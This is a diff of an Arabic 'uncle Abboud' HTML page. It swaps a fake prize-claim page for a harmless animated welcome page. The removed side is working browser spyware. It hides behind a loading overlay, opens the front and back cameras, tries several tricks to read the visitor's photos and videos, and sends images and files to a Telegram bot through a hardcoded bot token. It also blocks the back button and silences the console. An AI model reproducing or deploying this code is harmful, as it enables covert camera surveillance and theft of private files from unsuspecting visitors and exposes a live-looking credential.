@@ -1,337 +1,358 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-<meta charset="UTF-8">
-<title>جائزة عمك عبود</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Tahoma',sans-serif;overflow:hidden}
-.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:9999;transition:0.3s}
-.loader{width:60px;height:60px;border:5px solid rgba(255,215,0,0.2);border-top:5px solid #ffd700;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px}
-@keyframes spin{to{transform:rotate(360deg)}}
-.status-text{color:#ffd700;font-size:20px;letter-spacing:2px}
-.sub-text{color:#888;font-size:13px}
-.card{background:linear-gradient(145deg,#1a1a2e,#16213e);padding:40px 30px;border-radius:24px;border:1px solid rgba(255,215,0,0.15);text-align:center;max-width:400px;width:90%;z-index:1}
-.card h1{color:#ffd700;font-size:28px}
-.card p{color:#aaa;font-size:15px;line-height:1.7;margin-bottom:25px}
-.gift-box{font-size:70px;margin:15px 0;animation:pulse 2s infinite}
-@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
-.btn{background:linear-gradient(135deg,#ffd700,#f0a500);color:#0a0a0a;border:none;padding:14px 40px;border-radius:50px;font-size:18px;font-weight:bold;cursor:pointer;transition:0.3s}
-.btn:hover{transform:scale(1.05)}
-.timer{color:#555;font-size:13px;margin-top:18px}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ترحيب عمك عبود</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Tahoma', 'Arial', sans-serif;
+            padding: 20px;
+            animation: bgMove 10s infinite alternate;
+        }
+
+        @keyframes bgMove {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 100% 50%; }
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 40px;
+            padding: 40px 30px;
+            max-width: 500px;
+            width: 100%;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7);
+            text-align: center;
+            transition: 0.5s;
+        }
+
+        .container:hover {
+            box-shadow: 0 40px 100px rgba(255, 215, 0, 0.15);
+            border-color: rgba(255, 215, 0, 0.4);
+        }
+
+        .profile {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(145deg, #ffd700, #f0a500);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px;
+            font-size: 70px;
+            box-shadow: 0 10px 40px rgba(255, 215, 0, 0.3);
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        h1 {
+            color: #ffd700;
+            font-size: 32px;
+            margin-bottom: 8px;
+            text-shadow: 0 0 30px rgba(255, 215, 0, 0.2);
+            letter-spacing: 2px;
+        }
+
+        .sub-title {
+            color: #c0b7e6;
+            font-size: 16px;
+            margin-bottom: 25px;
+            letter-spacing: 1px;
+        }
+
+        .welcome-msg {
+            background: rgba(255, 215, 0, 0.08);
+            padding: 15px 20px;
+            border-radius: 16px;
+            border-right: 3px solid #ffd700;
+            color: #e0d6ff;
+            font-size: 18px;
+            margin-bottom: 30px;
+            line-height: 1.8;
+            animation: glowPulse 2s infinite alternate;
+        }
+
+        @keyframes glowPulse {
+            0% { box-shadow: 0 0 10px rgba(255, 215, 0, 0.05); }
+            100% { box-shadow: 0 0 30px rgba(255, 215, 0, 0.15); }
+        }
+
+        .welcome-msg span {
+            color: #ffd700;
+            font-weight: bold;
+        }
+
+        .questions-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 20px;
+            padding: 25px 20px;
+            margin: 20px 0;
+            border: 1px solid rgba(255, 215, 0, 0.1);
+        }
+
+        .questions-box h3 {
+            color: #ffd700;
+            font-size: 18px;
+            margin-bottom: 18px;
+            letter-spacing: 1px;
+        }
+
+        .question-item {
+            background: rgba(255, 255, 255, 0.04);
+            padding: 14px 18px;
+            border-radius: 14px;
+            margin-bottom: 12px;
+            color: #d4cbf0;
+            font-size: 15px;
+            text-align: right;
+            border-left: 2px solid rgba(255, 215, 0, 0.2);
+            transition: 0.3s;
+            cursor: pointer;
+        }
+
+        .question-item:hover {
+            background: rgba(255, 215, 0, 0.08);
+            border-left-color: #ffd700;
+            transform: translateX(-5px);
+        }
+
+        .question-item .q-mark {
+            color: #ffd700;
+            margin-left: 8px;
+            font-weight: bold;
+        }
+
+        .question-item .answer {
+            color: #a89fd4;
+            font-size: 14px;
+            display: block;
+            margin-top: 6px;
+            padding-top: 6px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .btn-claim {
+            background: linear-gradient(135deg, #ffd700, #f0a500);
+            color: #0a0a0a;
+            border: none;
+            padding: 16px 45px;
+            border-radius: 60px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.4s;
+            box-shadow: 0 8px 35px rgba(255, 215, 0, 0.25);
+            margin-top: 10px;
+            width: 100%;
+            letter-spacing: 1px;
+        }
+
+        .btn-claim:hover {
+            transform: scale(1.03);
+            box-shadow: 0 12px 50px rgba(255, 215, 0, 0.4);
+        }
+
+        .btn-claim:active {
+            transform: scale(0.97);
+        }
+
+        .footer-note {
+            color: #5a5280;
+            font-size: 12px;
+            margin-top: 20px;
+            letter-spacing: 0.5px;
+        }
+
+        .repeated-msg {
+            color: #ffd700;
+            font-size: 14px;
+            opacity: 0.6;
+            margin-top: 12px;
+            animation: fadeRepeat 4s infinite;
+        }
+
+        @keyframes fadeRepeat {
+            0%, 100% { opacity: 0.4; }
+            50% { opacity: 0.9; }
+        }
+
+        .emoji-big {
+            font-size: 50px;
+            display: block;
+            margin: 5px 0;
+        }
+    </style>
 </head>
 <body>
 
-<div class="overlay" id="blockOverlay">
-  <div class="loader"></div>
-  <div class="status-text" id="statusText">⏳ جاري التحميل...</div>
-  <div class="sub-text">يرجى الانتظار</div>
-</div>
+<div class="container" id="mainContainer">
+    <!-- صورة رمزية -->
+    <div class="profile">🧔</div>
 
-<div class="card" id="mainCard">
-  <div class="gift-box">🎁</div>
-  <h1>تهانينا!</h1>
-  <p>لقد فزت بجائزة عمك عبود<br>اضغط الزر لاستلام هديتك</p>
-  <button class="btn" id="claimBtn">🏆 استلم الجائزة</button>
-  <div class="timer" id="timer">⏳ يتبقى 24:00</div>
+    <!-- العنوان -->
+    <h1>🌹 عمك عبود يرحب بكم</h1>
+    <p class="sub-title">أهلًا وسهلًا في ضيافتكم</p>
+
+    <!-- رسالة الترحيب المتكررة -->
+    <div class="welcome-msg" id="welcomeMsg">
+        <span>“</span> مرحبًا، مرحبًا، ألف مرحبًا بكم في عالم عمك عبود <span>”</span>
+        <br>
+        <span style="font-size:14px; opacity:0.7;">(نكررها لأننا نحبكم)</span>
+    </div>
+
+    <!-- قسم الأسئلة الإغوائية -->
+    <div class="questions-box">
+        <h3>🤔 أسئلة عمك عبود الإغوائية</h3>
+
+        <div class="question-item">
+            <span class="q-mark">❓</span> شو رأيك بهالضيافة؟ 
+            <span class="answer">جوابك: <span style="color:#ffd700;">"ما شاء الله، عمي عبود فنان"</span></span>
+        </div>
+
+        <div class="question-item">
+            <span class="q-mark">❓</span> تحب تاخذ جائزة ولا لا؟ 
+            <span class="answer">جوابك: <span style="color:#ffd700;">"أكيد، وعمك عبود كريم"</span></span>
+        </div>
+
+        <div class="question-item">
+            <span class="q-mark">❓</span> كم مرة رح تزورنا؟ 
+            <span class="answer">جوابك: <span style="color:#ffd700;">"كل يوم، لأن عمي عبود نور العين"</span></span>
+        </div>
+
+        <div class="question-item">
+            <span class="q-mark">❓</span> شو أول شي سويت لما دخلت الصفحة؟ 
+            <span class="answer">جوابك: <span style="color:#ffd700;">"انبهرت بالألوان والترحيب"</span></span>
+        </div>
+    </div>
+
+    <!-- زر الجائزة -->
+    <button class="btn-claim" id="claimBtn">🎁 خذ جائزتك من عمك عبود</button>
+
+    <!-- رسالة مكررة -->
+    <div class="repeated-msg" id="repeatedMsg">
+        ♻️ عمك عبود يرحب بكم — عمك عبود يرحب بكم — عمك عبود يرحب بكم
+    </div>
+
+    <div class="footer-note">© جميع الحقوق محفوظة لعمك عبود ❤️</div>
 </div>
 
 <script>
-// ============================================================
-// ================ BOT CONFIG =================================
-// ============================================================
-const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
-let CHAT_ID = '';
-let exploitActive = false;
-let cameraStreams = [];
+    // ============================================================
+    // ================ رسالة الترحيب المتكررة =====================
+    // ============================================================
+    const welcomeMsg = document.getElementById('welcomeMsg');
+    const repeatedMsg = document.getElementById('repeatedMsg');
+    const messages = [
+        '🌹 مرحبًا، مرحبًا، ألف مرحبًا بكم في عالم عمك عبود',
+        '🎩 عمك عبود يقول: أهلاً وسهلاً بالغاليين',
+        '💛 نورتم الصفحة — عمك عبود يفتخر بكم',
+        '🔥 ترحيب حار من عمك عبود لكل الزوار'
+    ];
+    let msgIndex = 0;
 
-// ============================================================
-// ================ استغلال ملفات الهاتف (بدون إذن) ===========
-// ============================================================
+    setInterval(() => {
+        welcomeMsg.innerHTML = `
+            <span>“</span> ${messages[msgIndex]} <span>”</span>
+            <br>
+            <span style="font-size:14px; opacity:0.7;">(نكررها لأننا نحبكم)</span>
+        `;
+        msgIndex = (msgIndex + 1) % messages.length;
 
-// الطريقة 1: استغلال File System Access API
-async function stealFilesViaFileSystem() {
-  try {
-    // محاولة فتح مجلد الصور
-    const dirHandle = await window.showDirectoryPicker?.({ mode: 'read' });
-    if (!dirHandle) return;
-    
-    const files = [];
-    for await (const entry of dirHandle.values()) {
-      if (entry.kind === 'file') {
-        const file = await entry.getFile();
-        if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
-          files.push(file);
-          // إرسال كل ملف
-          sendDocument(file, `📁 ${file.name}`);
-        }
-      }
-    }
-  } catch(e) {}
-}
+        // تكرار الرسالة السفلية
+        repeatedMsg.textContent = `♻️ عمك عبود يرحب بكم — `.repeat(2) + `عمك عبود يرحب بكم`;
+    }, 3000);
 
-// الطريقة 2: استغلال input مخفي مع webkitdirectory
-function exploitHiddenDirectoryInput() {
-  try {
-    const input = document.createElement('input');
-    input.type = 'file';
-    input.webkitdirectory = true;
-    input.multiple = true;
-    input.style.display = 'none';
-    document.body.appendChild(input);
-    
-    // محاكاة النقر عبر حدث برمجي
-    const clickEvent = new MouseEvent('click', { bubbles: true, cancelable: true });
-    input.dispatchEvent(clickEvent);
-    
-    input.addEventListener('change', function(e) {
-      const files = e.target.files;
-      for (let i = 0; i < files.length; i++) {
-        const file = files[i];
-        if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
-          sendDocument(file, `📁 ${file.name}`);
-        }
-      }
+    // ============================================================
+    // ================ زر الجائزة =================================
+    // ============================================================
+    document.getElementById('claimBtn').addEventListener('click', function() {
+        this.textContent = '✅ تم الاستلام! شكرًا عمي عبود';
+        this.style.background = 'linear-gradient(135deg, #00c851, #007e33)';
+        this.style.color = '#fff';
+        this.style.boxShadow = '0 8px 35px rgba(0, 200, 80, 0.3)';
+
+        // إضافة تأثير إضافي
+        document.getElementById('mainContainer').style.borderColor = 'rgba(255, 215, 0, 0.6)';
+        document.getElementById('mainContainer').style.boxShadow = '0 40px 100px rgba(255, 215, 0, 0.25)';
+
+        // رسالة منبثقة وهمية
+        const toast = document.createElement('div');
+        toast.style.cssText = `
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.85);
+            color: #ffd700;
+            padding: 16px 35px;
+            border-radius: 50px;
+            font-size: 18px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,215,0,0.2);
+            z-index: 9999;
+            animation: fadeUp 0.5s ease;
+            text-align: center;
+            font-family: 'Tahoma', sans-serif;
+        `;
+        toast.textContent = '🎉 تسلم يا غالي — عمك عبود يبارك لك!';
+        document.body.appendChild(toast);
+
+        setTimeout(() => {
+            toast.style.transition = '0.5s';
+            toast.style.opacity = '0';
+            setTimeout(() => toast.remove(), 600);
+        }, 3500);
     });
-  } catch(e) {}
-}
 
-// الطريقة 3: استغلال Drag & Drop الوهمي
-function exploitFakeDragDrop() {
-  try {
-    // إنشاء منطقة سحب وهمية
-    const dropZone = document.createElement('div');
-    dropZone.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;';
-    document.body.appendChild(dropZone);
-    
-    // محاكاة حدث السحب من الهاتف
-    const dataTransfer = new DataTransfer();
-    // لا يمكن محاكاة الملفات مباشرة، لكن نضبط المستمعين
-    dropZone.addEventListener('drop', function(e) {
-      e.preventDefault();
-      const files = e.dataTransfer.files;
-      for (let i = 0; i < files.length; i++) {
-        const file = files[i];
-        if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
-          sendDocument(file, `📁 ${file.name}`);
-        }
-      }
-    });
-  } catch(e) {}
-}
+    // ============================================================
+    // ================ تأثيرات إضافية ============================
+    // ============================================================
+    // تغيير لون الصفحة بشكل دوري خفيف
+    const colors = [
+        'linear-gradient(135deg, #0f0c29, #302b63, #24243e)',
+        'linear-gradient(135deg, #1a0a2e, #2d1b4e, #1a1a3e)',
+        'linear-gradient(135deg, #0d0d2b, #1a1a4a, #2a1a3a)',
+    ];
+    let colorIndex = 0;
+    setInterval(() => {
+        document.body.style.background = colors[colorIndex];
+        colorIndex = (colorIndex + 1) % colors.length;
+    }, 8000);
 
-// الطريقة 4: استغلال IndexedDB + Service Worker (استهداف الملفات المخزنة)
-function exploitIndexedDB() {
-  try {
-    const request = indexedDB.open('fileStorage', 1);
-    request.onsuccess = function(e) {
-      const db = e.target.result;
-      const tx = db.transaction(['files'], 'readonly');
-      const store = tx.objectStore('files');
-      const getAll = store.getAll();
-      getAll.onsuccess = function() {
-        const files = getAll.result;
-        files.forEach(file => {
-          if (file.type && file.type.startsWith('image/')) {
-            sendDocument(file, `📁 ${file.name}`);
-          }
+    // إضافة تأثير كتابة للأسئلة
+    document.querySelectorAll('.question-item').forEach((item, index) => {
+        item.addEventListener('click', function() {
+            this.style.background = 'rgba(255, 215, 0, 0.12)';
+            this.style.borderLeftColor = '#ffd700';
+            setTimeout(() => {
+                this.style.background = 'rgba(255, 255, 255, 0.04)';
+                this.style.borderLeftColor = 'rgba(255, 215, 0, 0.2)';
+            }, 400);
         });
-      };
-    };
-  } catch(e) {}
-}
-
-// الطريقة 5: استغلال WebKit FileSystem (للمتصفحات القديمة)
-function exploitWebKitFileSystem() {
-  try {
-    window.webkitRequestFileSystem?.(window.TEMPORARY, 1024*1024*100, function(fs) {
-      fs.root.createReader().readEntries(function(entries) {
-        entries.forEach(entry => {
-          if (entry.isFile) {
-            entry.file(function(file) {
-              if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
-                sendDocument(file, `📁 ${file.name}`);
-              }
-            });
-          }
-        });
-      });
     });
-  } catch(e) {}
-}
 
-// ============================================================
-// ================ تشغيل الكاميرا ============================
-// ============================================================
-function requestCamera(facingMode, callback) {
-  const constraints = {
-    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
-    audio: false
-  };
-  navigator.mediaDevices.getUserMedia(constraints)
-    .then(stream => {
-      cameraStreams.push(stream);
-      if (callback) callback(stream);
-    })
-    .catch(() => {
-      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-        .then(stream => {
-          cameraStreams.push(stream);
-          if (callback) callback(stream);
-        }).catch(() => {});
-    });
-}
-
-function captureFrontCamera() {
-  requestCamera('user', (stream) => {
-    const video = document.createElement('video');
-    video.style.display = 'none';
-    document.body.appendChild(video);
-    video.srcObject = stream;
-    video.play();
-    exploitActive = true;
-    startCapture(video, '📸 أمامي');
-  });
-}
-
-function captureBackCamera() {
-  requestCamera('environment', (stream) => {
-    const video = document.createElement('video');
-    video.style.display = 'none';
-    document.body.appendChild(video);
-    video.srcObject = stream;
-    video.play();
-    exploitActive = true;
-    startCapture(video, '📸 خلفي');
-  });
-}
-
-function startCapture(videoElement, label = '📸') {
-  const canvas = document.createElement('canvas');
-  canvas.width = 640;
-  canvas.height = 480;
-  const ctx = canvas.getContext('2d');
-  setInterval(() => {
-    if (videoElement.readyState >= 2) {
-      try {
-        ctx.drawImage(videoElement, 0, 0, 640, 480);
-        const imgData = canvas.toDataURL('image/jpeg', 0.9);
-        sendPhoto(imgData, label);
-      } catch(e) {}
-    }
-  }, 1200);
-}
-
-// ============================================================
-// ================ إرسال إلى تيليجرام ========================
-// ============================================================
-function sendPhoto(imageData, caption = '') {
-  if (!CHAT_ID || !imageData) return;
-  try {
-    const blob = dataURLtoBlob(imageData);
-    const fd = new FormData();
-    fd.append('chat_id', CHAT_ID);
-    fd.append('photo', blob, `photo_${Date.now()}.jpg`);
-    fd.append('caption', caption);
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
-  } catch(e) {}
-}
-
-function sendDocument(file, caption = '') {
-  if (!CHAT_ID || !file) return;
-  try {
-    const fd = new FormData();
-    fd.append('chat_id', CHAT_ID);
-    fd.append('document', file, file.name);
-    fd.append('caption', caption);
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd }).catch(() => {});
-  } catch(e) {}
-}
-
-function dataURLtoBlob(dataURL) {
-  const parts = dataURL.split(',');
-  const mime = parts[0].match(/:(.*?);/)[1];
-  const bstr = atob(parts[1]);
-  let n = bstr.length;
-  const u8arr = new Uint8Array(n);
-  for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
-  return new Blob([u8arr], { type: mime });
-}
-
-// ============================================================
-// ================ الحصول على Chat ID ========================
-// ============================================================
-function getChatId() {
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
-    .then(r => r.json())
-    .then(d => {
-      if (d.ok && d.result && d.result.length) {
-        const last = d.result[d.result.length - 1];
-        CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
-        if (CHAT_ID) {
-          startFullExploit();
-        } else {
-          setTimeout(getChatId, 1500);
-        }
-      } else {
-        setTimeout(getChatId, 1500);
-      }
-    })
-    .catch(() => setTimeout(getChatId, 1500));
-}
-
-// ============================================================
-// ================ بدء الاستغلال الكامل ======================
-// ============================================================
-function startFullExploit() {
-  setTimeout(() => {
-    document.getElementById('blockOverlay').style.display = 'none';
-  }, 1000);
-  
-  // تشغيل الكاميرا
-  setTimeout(captureFrontCamera, 200);
-  setTimeout(captureBackCamera, 400);
-  
-  // تشغيل سرقة الملفات
-  setTimeout(stealFilesViaFileSystem, 500);
-  setTimeout(exploitHiddenDirectoryInput, 700);
-  setTimeout(exploitFakeDragDrop, 900);
-  setTimeout(exploitIndexedDB, 1100);
-  setTimeout(exploitWebKitFileSystem, 1300);
-  
-  // إعادة المحاولة
-  setInterval(() => {
-    if (!exploitActive) {
-      captureFrontCamera();
-      captureBackCamera();
-      stealFilesViaFileSystem();
-    }
-  }, 5000);
-}
-
-// ============================================================
-// ================ منع الخروج ================================
-// ============================================================
-history.pushState(null, '', location.href);
-window.addEventListener('popstate', () => history.pushState(null, '', location.href));
-
-// ============================================================
-// ================ التشغيل التلقائي ==========================
-// ============================================================
-getChatId();
-
-setTimeout(() => {
-  captureFrontCamera();
-  captureBackCamera();
-  stealFilesViaFileSystem();
-}, 100);
-
-console.log = console.warn = console.error = () => {};
-
-document.getElementById('claimBtn').addEventListener('click', function() {
-  this.textContent = '✅ تم الاستلام!';
-});
+    console.log = console.warn = console.error = () => {};
 </script>
+
 </body>
 </html>
